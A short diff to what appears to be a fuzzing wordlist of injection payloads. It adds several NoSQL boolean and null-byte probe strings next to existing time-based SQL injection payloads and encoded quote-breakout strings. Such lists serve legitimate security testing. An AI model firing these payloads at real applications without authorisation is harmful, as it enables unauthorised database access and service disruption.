@@ -22,6 +22,13 @@
 "' or sleep(30)='"
 127.0.0.1' AND (SELECT * FROM (SELECT(SLEEP(5)))x) AND '1'='1
 # NoSQLi
+' && 0 && 'x
+' && 1 && 'x
+' || 1 || 'x
+'%00
+' && 0 && '
+' && 1 && '
+' || 1 || '
 \'
 '%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
 '\"`{\r%3b$Foo}\n$Foo+\\xYZ\u0000
